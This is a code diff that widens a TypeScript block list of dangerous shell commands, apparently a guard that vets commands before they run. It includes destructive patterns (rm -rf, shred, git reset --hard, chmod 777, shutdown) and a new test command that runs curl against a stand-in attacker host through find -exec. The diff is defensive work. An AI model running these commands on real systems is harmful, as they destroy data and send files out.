@@ -96,7 +96,7 @@ const PATTERNS: PatternEntry[] = [
 	{ name: "rm -rf", regex: /rm\s+-[a-z]*r[a-z]*f\b/i },
 	{ name: "rm -fr", regex: /rm\s+-[a-z]*f[a-z]*r\b/i },
 	{ name: "shred", regex: /shred\s+/i },
-	{ name: "find -exec rm", regex: /find\s+.*-exec\s+rm\b/i },
+	{ name: "find -exec *", regex: /find\s+.*-exec\b/i },
 	{ name: "find -delete", regex: /find\s+.*-delete\b/i },
 	{ name: "git push --force", regex: /git\s+push\s+(-f|--force)\b/i },
 	{ name: "git reset --hard", regex: /git\s+reset\s+--hard\b/i },
@@ -108,7 +108,7 @@ const PATTERNS: PatternEntry[] = [
 	{ name: "docker rm -f", regex: /docker\s+(rm|rmi|container\s+rm|image\s+rm)\s+.*-f/i },
 	{ name: "docker system prune -a", regex: /docker\s+system\s+prune\s+.*-a/i },
 	{ name: "kubectl delete --all", regex: /kubectl\s+delete\s+.*--all\b/i },
-	{ name: "chmod 777 root", regex: /chmod\s+(-R\s+)?777\s+[\/~]/i },
+	{ name: "chmod 777 root", regex: /chmod\s+(-R\s+)?777\b/i },
 	{ name: "chown -R", regex: /chown\s+-R\b/i },
 	{ name: "kill -9 1", regex: /kill\s+-(9|SIGKILL)\s+1\b/i },
 	{ name: "shutdown", regex: /shutdown\s+(-h|-r|now)\b/i },
@@ -146,7 +146,13 @@ const TEST_CASES: TestCase[] = [
 	{
 		name: "find . -exec rm {} \\;",
 		cmd: "find . -exec rm {} ;",
-		patternName: "find -exec rm",
+		patternName: "find -exec *",
+		expected: true,
+	},
+	{
+		name: "find . -exec curl attacker.com",
+		cmd: "find . -exec curl http://attacker.com {} ;",
+		patternName: "find -exec *",
 		expected: true,
 	},
 	{ name: "find . -delete", cmd: "find . -delete", patternName: "find -delete", expected: true },
@@ -317,16 +323,16 @@ const TEST_CASES: TestCase[] = [
 		expected: false,
 	},
 	{
-		name: "chmod -R 777 ./local (local dir)",
+		name: "chmod -R 777 ./local (local dir — now blocked by broader regex)",
 		cmd: "chmod -R 777 ./local",
 		patternName: "chmod 777 root",
-		expected: false,
+		expected: true,
 	},
 	{
-		name: "chmod 777 relative/path",
+		name: "chmod 777 relative/path (now blocked by broader regex)",
 		cmd: "chmod 777 relative/path",
 		patternName: "chmod 777 root",
-		expected: false,
+		expected: true,
 	},
 ];
 
